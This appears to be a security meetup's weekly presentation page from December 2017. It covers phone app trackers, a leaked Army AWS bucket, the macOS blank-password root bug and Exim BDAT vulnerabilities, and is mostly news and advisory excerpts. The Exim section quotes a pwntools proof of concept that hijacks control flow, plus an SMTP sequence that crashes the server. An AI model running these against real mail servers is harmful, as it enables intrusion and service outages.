

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>11.18. 2017-12-02 Static websites, phone tracking, AWS leaks, macOS root, exim &mdash; South Bay WASP 1.0.2 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
        <link rel="up" title="11. Pentest Presentations" href="../pentest_presentations.html"/>
        <link rel="prev" title="11.17. 2017-11-25 Not getting hacked, keystrokes, tracking, Fancy Bear, Intel ME" href="20171125_presentation.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="mitm.html">11.1. MitM Presentation</a></li>
<li class="toctree-l2"><a class="reference internal" href="http_headers.html">11.2. 2017-08-05 Attacking via HTTP Headers</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170812_presentation.html">11.3. 2017-08-12 VRT, cryptography, TLS 1.3, Broadpwn, cURL, and phishing</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170819_presentation.html">11.4. 2017-08-19 Forcing HTTPS, HTTP forwarding</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170826_presentation.html">11.5. 2017-08-26 Complexity, Cookies vs Tokens</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170909_presentation.html">11.6. 2017-09-09 Adding IPv6 on the EdgeRouter Lite</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170916_presentation.html">11.7. 2017-09-16 “VPN”</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170923_presentation.html">11.8. 2017-09-23 nftables</a></li>
<li class="toctree-l2"><a class="reference internal" href="20170930_presentation.html">11.9. 2017-09-30 virtualization and bridges</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171007_presentation.html">11.10. 2017-10-07 QEMU virtualization</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171014_presentation.html">11.11. 2017-10-14 Firewalls, building vulnerable hosts</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171021_presentation.html">11.12. 2017-10-21 IPv6 addressing, KRACK, Infineon RSA</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171028_presentation.html">11.13. 2017-10-28 IPv6 ULA, DHCPv6, /64 prefixes, Bad Rabbit</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171104_presentation.html">11.14. 2017-11-04 Cloud providers other than AWS</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171111_presentation.html">11.15. 2017-11-11 PKP removal, exploits galore</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171118_presentation.html">11.16. 2017-11-18 Privacy, safe languages, Linux networking</a></li>
<li class="toctree-l2"><a class="reference internal" href="20171125_presentation.html">11.17. 2017-11-25 Not getting hacked, keystrokes, tracking, Fancy Bear, Intel ME</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">11.18. 2017-12-02 Static websites, phone tracking, AWS leaks, macOS root, exim</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#links-and-updates-this-week">11.18.1. Links and updates this week</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#dns-leak-test">11.18.1.1. DNS leak test</a></li>
<li class="toctree-l4"><a class="reference internal" href="#not-getting-hacked-update">11.18.1.2. Not getting hacked update</a></li>
<li class="toctree-l4"><a class="reference internal" href="#static-websites">11.18.1.3. Static websites</a></li>
<li class="toctree-l4"><a class="reference internal" href="#tracking-via-phone-apps">11.18.1.4. Tracking via phone apps</a></li>
<li class="toctree-l4"><a class="reference internal" href="#classified-aws">11.18.1.5. Classified AWS</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#exploits-this-week">11.18.2. Exploits this week</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#top-secret-nsa-and-army-data-leaked-online">11.18.2.1. Top Secret NSA and Army data leaked online</a></li>
<li class="toctree-l4"><a class="reference internal" href="#macos-allows-login-as-root">11.18.2.2. macOS allows login as root</a></li>
<li class="toctree-l4"><a class="reference internal" href="#exim-rce-and-dos">11.18.2.3. Exim RCE and DoS</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_presentations.html">11. Pentest Presentations</a> &raquo;</li>
        
      <li>11.18. 2017-12-02 Static websites, phone tracking, AWS leaks, macOS root, exim</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/presentations/20171202_presentation.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="static-websites-phone-tracking-aws-leaks-macos-root-exim">
<h1>11.18. 2017-12-02 Static websites, phone tracking, AWS leaks, macOS root, exim<a class="headerlink" href="#static-websites-phone-tracking-aws-leaks-macos-root-exim" title="Permalink to this headline">¶</a></h1>
<div class="section" id="links-and-updates-this-week">
<h2>11.18.1. Links and updates this week<a class="headerlink" href="#links-and-updates-this-week" title="Permalink to this headline">¶</a></h2>
<div class="section" id="dns-leak-test">
<h3>11.18.1.1. DNS leak test<a class="headerlink" href="#dns-leak-test" title="Permalink to this headline">¶</a></h3>
<p>See <a class="reference external" href="https://www.dnsleaktest.com/">DNS leak test.com</a> for information on testing for DNS leaks.</p>
</div>
<div class="section" id="not-getting-hacked-update">
<h3>11.18.1.2. Not getting hacked update<a class="headerlink" href="#not-getting-hacked-update" title="Permalink to this headline">¶</a></h3>
<p><a class="reference internal" href="../study/not_getting_hacked.html#not-getting-hacked"><span class="std std-ref">Not getting hacked</span></a> was updated to reflect a link to <a class="reference external" href="https://www.belfercenter.org/cyberplaybook">Cybersecurity Campaign Playbook</a>.</p>
</div>
<div class="section" id="static-websites">
<h3>11.18.1.3. Static websites<a class="headerlink" href="#static-websites" title="Permalink to this headline">¶</a></h3>
<p>The section <a class="reference internal" href="../study/static_websites.html#static-websites"><span class="std std-ref">Static websites</span></a> has been added.</p>
</div>
<div class="section" id="tracking-via-phone-apps">
<h3>11.18.1.4. Tracking via phone apps<a class="headerlink" href="#tracking-via-phone-apps" title="Permalink to this headline">¶</a></h3>
<p>From <a class="reference external" href="https://theintercept.com/2017/11/24/staggering-variety-of-clandestine-trackers-found-in-popular-android-apps/">Staggering Variety of Clandestine Trackers Found in Popular Android Apps</a>:</p>
<blockquote>
<div><p>Researchers at Yale Privacy Lab and French nonprofit Exodus Privacy have documented the proliferation of tracking software on smartphones, finding that weather, flashlight, ride-sharing, and dating apps, among others, are infested with dozens of different types of trackers collecting vast amounts of information to better target advertising.</p>
<p>Exodus security researchers <a class="reference external" href="https://exodus-privacy.eu.org/">identified 44 trackers in more than 300 apps</a> for Google’s Android smartphone operating system. The apps, collectively, have been downloaded billions of times. Yale Privacy Lab, within the university’s law school, is working to replicate the Exodus findings and has already <a class="reference external" href="https://privacylab.yale.edu/">released reports</a> on 25 of the trackers.</p>
<p>Yale Privacy Lab researchers have only been able to analyze Android apps but believe many of the trackers also exist on iOS, since companies often distribute for both platforms. To find trackers, the Exodus researchers built a custom auditing platform for Android apps, which searched through the apps for digital “signatures” distilled from known trackers.</p>
<p>Among the Android apps researchers identified were, with six or seven trackers each, dating apps Tinder and OkCupid, the Weather Channel app, and Super-Bright LED Flashlight; the app for digital music service Spotify, which embedded four trackers, including two from Google; ride-sharing service Uber, with three trackers; and Skype, Lyft, AccuWeather, and Microsoft Outlook.</p>
</div></blockquote>
<p>See <a class="reference external" href="https://exodus-privacy.eu.org/">Exodus Privacy</a> for an overview of the <a class="reference external" href="https://github.com/exodus-privacy/exodus">Exodus-Privacy/exodus</a> tool and the Exodus Privacy French non-profit organization. They have a <a class="reference external" href="https://joinmastodon.org/">Mastodon</a> (see <a class="reference external" href="https://en.wikipedia.org/wiki/Mastodon_(software)">Mastodon (software)</a>) presence at <a class="reference external" href="https://framapiaf.org/&#64;exodus">Exodus Privacy Mastodon</a> with a link to <a class="reference external" href="https://www.itworld.com/article/3239684/mobile-wireless/when-the-threats-get-weird-the-security-solutions-get-weirder.html">When the threats get weird, the security solutions get weirder</a>:</p>
<blockquote>
<div><p>Tracking is a real problem for mobile apps, and this problem is underappreciated in considerations around BYOD policies.</p>
<p>Yale University Law School’s Privacy Lab and the France-based nonprofit Exodus Privacy have <a class="reference external" href="https://github.com/YalePrivacyLab/tracker-profiles">documented</a> that more than 75% of the more than 300 Android apps they looked at contained trackers of one kind or another, which mostly exist for advertising, behavioral analytics or location tracking.</p>
<p>Most of that location tracking relies on accessing GPS information, which requires user opt-in. But now, researchers at Princeton University <a class="reference external" href="https://www.princeton.edu/news/2017/11/29/phones-vulnerable-location-tracking-even-when-gps-services">have demonstrated</a> a potential privacy breach by creating an app called PinMe, which harvests location information on a smartphone without using GPS information.</p>
<p>In general, our belief that turning off the location feature of phones protected us from location snoops has been invalidated.</p>
<p>In fact, many of our assumptions around security are being challenged by new facts. Take two-factor authentication, for example.</p>
<p>A report last month by Javelin Strategy &amp; Research claimed that current applications of multi-factor authentication are “being undermined.” Two- or multi-factor authentication is also underutilized by enterprises, with just over one-third using “two or more factors to secure access to their data and systems.”</p>
<p>So we can’t trust two-factor authentication like we used to, and even if we could it’s wildly underutilized.</p>
<p>But surely we can trust Apple devices, right? Apple has a sterling reputation for strong security. Or, I should say, “had” such a reputation.</p>
</div></blockquote>
<p>The Exodus tool to find/analyze Android trackers is available at GitHub <a class="reference external" href="https://github.com/exodus-privacy/exodus">Exodus-Privacy/exodus</a>. It was used by the <a class="reference external" href="https://privacylab.yale.edu/">Yale Privacy Lab</a> to create a report announced at <a class="reference external" href="https://privacylab.yale.edu/press">#BlackFriday Announcement from Privacy Lab</a>. The detailed report is at <a class="reference external" href="https://github.com/YalePrivacyLab/tracker-profiles">Yale Privacy Lab - Tracker Profiles</a>.</p>
<p>From the <a class="reference external" href="https://privacylab.yale.edu/press">#BlackFriday Announcement from Privacy Lab</a>:</p>
<blockquote>
<div>More than 75% of the 300+ apps analyzed by Exodus contain the signatures of trackers, though this data does not tell the whole story. There is an entire industry based upon these trackers, and apps identified as “clean” today may contain trackers that have not yet been identified. Tracker code may also be added by developers to new versions of apps in the future. The Exodus platform identifies trackers via signatures, like an anti-virus or spyware scanner, and thus can only detect trackers previously identified by researchers at the time of the scan.</div></blockquote>
<p>From the <a class="reference external" href="https://privacylab.yale.edu/surveillance-map">Yale Privacy Lab - Surveillance Map</a>:</p>
<blockquote>
<div>Yale Privacy Lab is calling for transparency and public discussion concerning the steadily-increasing surveillance in our streets and near our homes, workplaces, and schools. This map is a starting point for conversation and action, focusing on Greater New Haven.</div></blockquote>
</div>
<div class="section" id="classified-aws">
<h3>11.18.1.5. Classified AWS<a class="headerlink" href="#classified-aws" title="Permalink to this headline">¶</a></h3>
<p>From <a class="reference external" href="https://aws.amazon.com/blogs/publicsector/announcing-the-new-aws-secret-region/">Announcing the New AWS Secret Region</a>:</p>
<blockquote>
<div>With the launch of this new Secret Region, AWS becomes the first and only commercial cloud provider to offer regions to serve government workloads across the full range of data classifications, including Unclassified, Sensitive, Secret, and Top Secret.</div></blockquote>
</div>
</div>
<div class="section" id="exploits-this-week">
<h2>11.18.2. Exploits this week<a class="headerlink" href="#exploits-this-week" title="Permalink to this headline">¶</a></h2>
<div class="section" id="top-secret-nsa-and-army-data-leaked-online">
<h3>11.18.2.1. Top Secret NSA and Army data leaked online<a class="headerlink" href="#top-secret-nsa-and-army-data-leaked-online" title="Permalink to this headline">¶</a></h3>
<p>From <a class="reference external" href="https://www.upguard.com/breaches/cloud-leak-inscom">Black Box, Red Disk: How Top Secret NSA and Army Data Leaked Online</a>:</p>
<blockquote>
<div><p>Critical data belonging to the United States <a class="reference external" href="https://www.inscom.army.mil/">Army Intelligence and Security Command (INSCOM)</a>, a joint US Army and National Security Agency (NSA) Defense Department command tasked with gathering intelligence for US military and political leaders, leaked onto the public internet, exposing internal data and virtual systems used for classified communications to anyone with an internet connection. With <a class="reference external" href="https://app.upguard.com/webscan?url=https%3A%2F%2Fwww.inscom.army.mil%2F">a middling CSTAR cyber risk score of 589 out of a maximum of 950</a>, INSCOM’s web presence provides troubling indications of gaps in their cybersecurity - exemplified by the presence of classified data within this publicly accessible data repository.</p>
<p>Among the most compelling downloadable assets revealed from within the exposed bucket is a virtual hard drive used for communications within secure federal IT environments, which, when opened, reveals classified data labeled <a class="reference external" href="http://www.spiegel.de/international/world/glossary-of-nsa-abbreviations-a-975930.html">NOFORN</a> - a restriction indicating a high level of sensitivity, prohibited from being disseminated even to foreign allies. The exposed data also reveals sensitive details concerning the Defense Department’s battlefield intelligence platform, <a class="reference external" href="http://asc.army.mil/web/portfolio-item/iews-dcgs-a/">the Distributed Common Ground System - Army (DCGS-A)</a> as well as <a class="reference external" href="https://nypost.com/2014/10/27/army-spent-5b-on-failed-technology-created-by-vets/">the platform’s troubled cloud auxiliary, codenamed “Red Disk.”</a></p>
<p>This cloud leak follows a number of previous Cyber Risk Team reports detailing Pentagon data exposures from within <a class="reference external" href="https://www.upguard.com/breaches/cloud-leak-centcom">the US Central Command, US Pacific Command</a>, and <a class="reference external" href="https://www.upguard.com/breaches/spy-games">the National Geospatial-Intelligence Agency</a>, a Defense Department agency tasked with acquiring and analyzing satellite imagery intelligence. Such continual and apparently accidental exposure of classified national security data to the wider internet is proof that even the most secretive corners of the IT landscape are not immune to the cyber risks befalling any enterprise operating at scale.</p>
</div></blockquote>
<p>Also see <a class="reference external" href="https://arstechnica.com/information-technology/2017/11/army-red-disk-intel-sharing-system-left-exposed-in-open-aws-data-store/">Researcher discovers classified Army intel app, data on open public AWS bucket</a>.</p>
</div>
<div class="section" id="macos-allows-login-as-root">
<h3>11.18.2.2. macOS allows login as root<a class="headerlink" href="#macos-allows-login-as-root" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2017-13872">CVE-2017-13872</a> is a serious vulnerability that</p>
<blockquote>
<div>… allows attackers to obtain administrator access without a password via certain interactions involving entry of the root user name.</div></blockquote>
<p>From <a class="reference external" href="https://objective-see.com/blog/blog_0x24.html">Why &lt;blank&gt; Gets You Root</a>:</p>
<blockquote>
<div>When a user (or attacker) attempts to log into an account that is not currently enabled (i.e. root), the system will create that account with whatever password the user specifies…even if that password is blank. Then the user (or attacker) can readily log into that account …</div></blockquote>
<p>Continuing on in the article, it was first posted on Nov 13, 2017:</p>
<blockquote>
<div><p>rather innocuously, to Apple’s very own Developer Formums…in order to aid a user …</p>
<p>However, the flaw only gained wider public attention, when Lemi Orhan Ergin (<a class="reference external" href="https://twitter.com/lemiorhan">&#64;lemiorhan</a>) posted a <strong>`tweet &lt;https://twitter.com/lemiorhan/status/935578694541770752&gt;`_</strong> stating that, “we noticed a <em>HUGE</em> security issue at MacOS High Sierra…”:</p>
<p>Let’s recap:</p>
<ul class="simple">
<li>For accounts that are disabled (i.e. don’t have ‘shadowhash’ data) macOS will attempt to perform an upgrade</li>
<li>During this upgrade, od_verify_crypt_password returns a non-zero value, and an error code which is not checked</li>
<li>The user (or attacked) specified password is then ‘upgraded’ and saved for the account</li>
</ul>
</div></blockquote>
<p><a class="reference external" href="https://support.apple.com/en-us/HT208315">About the security content of Security Update 2017-001</a> describes how to check that the patch has been applied.</p>
<p>From <a class="reference external" href="https://www.reuters.com/article/us-apple-cyber/apple-to-audit-development-processes-after-mac-bug-discovered-idUSKBN1DT2TJ">Apple to audit development processes after Mac bug discovered</a>:</p>
<blockquote>
<div>Apple Inc (AAPL.O) said on Wednesday it would review its software development process a day after a researcher discovered a bug in a new version of its Mac operating system that could give hackers total control of vulnerable machines.</div></blockquote>
</div>
<div class="section" id="exim-rce-and-dos">
<h3>11.18.2.3. Exim RCE and DoS<a class="headerlink" href="#exim-rce-and-dos" title="Permalink to this headline">¶</a></h3>
<p>Note: for details of SMTP BDAT see <a class="reference external" href="https://tools.ieft.org/html/rfc3030">RFC 3030</a> SMTP Service Extensions for Transmission of Large and Binary MIME Messages.</p>
<p>Note: from <a class="reference external" href="http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html">Mail (MX) Server Survey</a> Exim ran 56.64% of the 1,016,147 servers that were able to be fingerprinted. So bugs are a big deal.</p>
<p>There are 2 bugs resulting in 2 CVEs. From both <a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2017-16943">CVE-2017-16943</a> and <a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2017-16944">CVE-2017-16944</a>:</p>
<blockquote>
<div>The receive_msg function in receive.c in the SMTP daemon in Exim 4.88 and 4.89 allows remote attackers to cause a denial of service (infinite loop and stack exhaustion) via vectors involving BDAT commands and an improper check for a ‘.’ character signifying the end of the content, related to the bdat_getc function.</div></blockquote>
<p>The first (RCE) bug was reported as <a class="reference external" href="https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html">[exim-announce] Critical Exim Security Vulnerability: disable chunking</a>:</p>
<blockquote>
<div><p>A remote code execution vulnerability has been reported in Exim, with immediate public disclosure (we were given no private notice).</p>
<p>With immediate effect, please apply this workaround: if you are running Exim 4.88 or newer (4.89 is current, 4.90 is upcoming) then in the main section of your Exim configuration, set:</p>
<blockquote>
<div>chunking_advertise_hosts =</div></blockquote>
<p>That’s an empty value, nothing on the right of the equals. This disables advertising the ESMTP CHUNKING extension, making the BDAT verb unavailable and avoids letting an attacker apply the logic.</p>
<p>This should be a complete workaround. Impact of applying the workaround is that mail senders have to stick to the traditional DATA verb instead of using BDAT.</p>
</div></blockquote>
<p>This bug was reported publically via <a class="reference external" href="https://bugs.exim.org/show_bug.cgi?id=2199">Bug 2199 - Exim use-after-free vulnerability while reading mail header</a>:</p>
<blockquote>
<div><p>Hi, we found a use-after-free vulnerability which is exploitable to RCE in the SMTP server.</p>
<p>To trigger this bug, BDAT command is necessary to perform an allocation by raising an error. Through our research, we confirm that this vulnerability can be exploited to remote code execution if the binary is not compiled with PIE.</p>
<p>An RIP controlling PoC is in attachment poc.py. The following is the gdb result of this PoC:</p>
<blockquote>
<div>Program received signal SIGSEGV, Segmentation fault.
0x00000000deadbeef in ?? ()
(gdb)</div></blockquote>
<p>By the way, I want to apologize for accidentally making this bug public directly. I read SecurityReleaseProcess in wiki, googled and didn’t find an email address to report. So I decided to report to this bugzilla and did not notice any option to set it private (and I thought maybe security issues are default to private). Anyway, I see the notification in report process now. Sorry for that.</p>
<p>The notification is new, part of “lessons learned”.  You didn’t miss it, I added it in reaction to this incident.</p>
<p>We should have had something clearer up before.  We didn’t.  Shit happens, we pick ourselves back up, learn from it, fix things and move on.</p>
</div></blockquote>
<p>The attached PoC is:</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># pip install pwntools</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;EHLO test&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;250 HELP&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;MAIL FROM:&lt;test@localhost&gt;&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;RCPT TO:&lt;test@localhost&gt;&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="c1">#raw_input()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1100</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#raw_input()</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;command&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;BDAT 1&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;:BDAT </span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1e00</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="o">+</span> <span class="s1">&#39;:</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;command&#39;</span><span class="p">)</span>
<span class="c1">#raw_input()</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="nb">exit</span><span class="p">()</span>
</pre></div>
</div>
<p>The second (DoS) bug was reported as <a class="reference external" href="https://bugs.exim.org/show_bug.cgi?id=2201">Bug 2201 - Exim handles BDAT data incorrectly and leads to crash</a>:</p>
<blockquote>
<div><p>While parsing BDAT data header, exim still scans for ‘.’ and consider it the end of mail.</p>
<blockquote>
<div><a class="reference external" href="https://github.com/Exim/exim/blob/master/src/src/receive.c#L1867">https://github.com/Exim/exim/blob/master/src/src/receive.c#L1867</a></div></blockquote>
<p>Exim goes into an incorrect state after this message is sent because the function pointer receive_getc is not reset. If the following command is also a BDAT, receive_getc and lwr_receive_getc become the same and an infinite loop occurs inside bdat_getc. Program crashes due to running out of stack.</p>
<blockquote>
<div><a class="reference external" href="https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L547">https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L547</a></div></blockquote>
<p>Here is a simple PoC which leads to an infinite loop and program crash:</p>
<div class="highlight-text"><div class="highlight"><pre><span></span>```
EHLO localhost
MAIL FROM:&lt;test@localhost&gt;
RCPT TO:&lt;test@localhost&gt;
BDAT 10
.
BDAT 0
```
</pre></div>
</div>
</div></blockquote>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
      
        <a href="20171125_presentation.html" class="btn btn-neutral" title="11.17. 2017-11-25 Not getting hacked, keystrokes, tracking, Fancy Bear, Intel ME" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.2',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>